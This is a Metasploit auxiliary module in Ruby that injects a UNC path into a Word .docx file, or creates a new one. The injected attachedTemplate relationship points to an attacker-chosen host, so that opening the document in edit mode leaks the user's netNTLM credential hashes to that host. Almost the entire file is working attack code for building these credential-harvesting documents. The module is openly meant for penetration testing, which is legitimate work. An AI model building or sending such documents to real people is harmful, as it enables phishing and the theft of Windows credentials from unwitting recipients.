##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://Metasploit.com/projects/Framework/
##

require 'msf/core'
require 'zip/zip' #for extracting files
require 'rex/zip' #for creating files

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft Word UNC Path Injector',
      'Description'    => %q{
          This module modifies a .docx file that will, upon opening, submit stored
        netNTLM credentials to a remote host. It can also create an empty docx file. If
        emailed the receiver needs to put the document in editing mode before the remote
        server will be contacted. Preview and read-only mode do not work. Verified to work
        with Microsoft Word 2003, 2007 and 2010 as of January 2013. In order to get the
        hashes the auxiliary/server/capture/smb module can be used.
      },
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://jedicorp.com/?p=534' ]
        ],
      'Author'         =>
        [
          'SphaZ <cyberphaz[at]gmail.com>'
        ]
    ))

    register_options(
      [
        OptAddress.new('LHOST',[true, 'Server IP or hostname that the .docx document points to.']),
        OptPath.new('SOURCE', [false, 'Full path and filename of .docx file to use as source. If empty, creates new document.']),
        OptString.new('FILENAME', [true, 'Document output filename.', 'msf.docx']),
        OptString.new('DOCAUTHOR',[false,'Document author for empty document.']),
      ], self.class)
  end

  #here we create an empty .docx file with the UNC path. Only done when FILENAME is empty
  def make_new_file
    metadata_file_data = ""
    metadata_file_data << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><cp:coreProperties"
    metadata_file_data << " xmlns:cp=\"http://schemas.openxmlformats.org/package/2006/metadata/core-properties\" "
    metadata_file_data << "xmlns:dc=\"http://purl.org/dc/elements/1.1/\" xmlns:dcterms=\"http://purl.org/dc/terms/\" "
    metadata_file_data << "xmlns:dcmitype=\"http://purl.org/dc/dcmitype/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">"
    metadata_file_data << "<dc:creator>#{datastore['DOCAUTHOR']}</dc:creator><cp:lastModifiedBy>#{datastore['DOCAUTHOR']}"
    metadata_file_data << "</cp:lastModifiedBy><cp:revision>1</cp:revision><dcterms:created xsi:type=\"dcterms:W3CDTF\">"
    metadata_file_data << "2013-01-08T14:14:00Z</dcterms:created><dcterms:modified xsi:type=\"dcterms:W3CDTF\">"
    metadata_file_data << "2013-01-08T14:14:00Z</dcterms:modified></cp:coreProperties>"

    #where to find the skeleton files required for creating an empty document
    data_dir = File.join(Msf::Config.data_directory, "exploits", "docx")

    zip_data = {}

    #add skeleton files
    vprint_status("Adding skeleton files from #{data_dir}")
    Dir["#{data_dir}/**/**"].each do |file|
      if not File.directory?(file)
        zip_data[file.sub(data_dir,'')] = File.read(file)
      end
    end

    #add on-the-fly created documents
    vprint_status("Adding injected files")
    zip_data["docProps/core.xml"] = metadata_file_data
    zip_data["word/_rels/settings.xml.rels"] = @rels_file_data

    #add the otherwise skipped "hidden" file
    file = "#{data_dir}/_rels/.rels"
    zip_data[file.sub(data_dir,'')] = File.read(file)
    #and lets create the file
    zip_docx(zip_data)
  end

  #here we inject an UNC path into an existing file, and store the injected file in FILENAME
  def manipulate_file
    ref = "<w:attachedTemplate r:id=\"rId1\"/>"

    if not File.stat(datastore['SOURCE']).readable?
      print_error("Not enough rights to read the file. Aborting.")
      return nil
    end

    #lets extract our docx and store it in memory
    zip_data = unzip_docx

    #file to check for reference file we need
    file_content = zip_data["word/settings.xml"]
    if file_content.nil?
      print_error("Bad \"word/settings.xml\" file, check if it is a valid .docx.")
      return nil
    end

    #if we can find the reference to our inject file, we don't need to add it and can just inject our unc path.
    if not file_content.index("w:attachedTemplate r:id=\"rId1\"").nil?
      vprint_status("Reference to rels file already exists in settings file, we dont need to add it :)")
      zip_data["word/_rels/settings.xml.rels"] = @rels_file_data
      # lets zip the end result
      zip_docx(zip_data)
    else
      #now insert the reference to the file that will enable our malicious entry
      insert_one = file_content.index("<w:defaultTabStop")

      if insert_one.nil?
        insert_two = file_content.index("<w:hyphenationZone") # 2nd choice
        if not insert_two.nil?
          vprint_status("HypenationZone found, we use this for insertion.")
          file_content.insert(insert_two, ref )
        end
      else
        vprint_status("DefaultTabStop found, we use this for insertion.")
        file_content.insert(insert_one, ref )
      end

      if insert_one.nil? && insert_two.nil?
        print_error("Cannot find insert point for reference into settings.xml")
        return nil
      end

      #update the files that contain the injection and reference
      zip_data["word/settings.xml"] = file_content
      zip_data["word/_rels/settings.xml.rels"] = @rels_file_data
      #lets zip the file
      zip_docx(zip_data)
    end
    return 0
  end

  #making the actual docx from the hash
  def zip_docx(zip_data)
    docx = Rex::Zip::Archive.new
    zip_data.each_pair do |k,v|
      docx.add_file(k,v)
    end
    file_create(docx.pack)
  end

  #unzip the .docx document. sadly Rex::zip does not uncompress so we do it the Rubyzip way
  def unzip_docx
    #Ruby sometimes corrupts the document when manipulating inside a compressed document, so we extract it with Zip::ZipFile
    vprint_status("Extracting #{datastore['SOURCE']} into memory.")
    #we read it all into memory
    zip_data = Hash.new
    begin
      Zip::ZipFile.open(datastore['SOURCE'])  do |filezip|
        filezip.each do |entry|
          zip_data[entry.name] = filezip.read(entry)
        end
      end
    rescue Zip::ZipError => e
      print_error("Error extracting #{datastore['SOURCE']} please verify it is a valid .docx document.")
      return nil
    end
    return zip_data
  end


  def run
    #we need this in make_new_file and manipulate_file
    @rels_file_data = ""
    @rels_file_data << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>".chomp
    @rels_file_data << "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">".chomp
    @rels_file_data << "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/".chomp
    @rels_file_data << "attachedTemplate\" Target=\"file://\\\\#{datastore['LHOST']}\\normal.dot\" TargetMode=\"External\"/></Relationships>"

    if "#{datastore['SOURCE']}" == ""
      #make an empty file
      print_status("Creating empty document that points to #{datastore['LHOST']}.")
      make_new_file
    else
      #extract the word/settings.xml and edit in the reference we need
      print_status("Injecting UNC path into existing document.")
      if manipulate_file.nil?
        print_error("Failed to create a document from #{datastore['SOURCE']}.")
      else
        print_good("Copy of #{datastore['SOURCE']} called #{datastore['FILENAME']} points to #{datastore['LHOST']}.")
      end
    end
  end
end
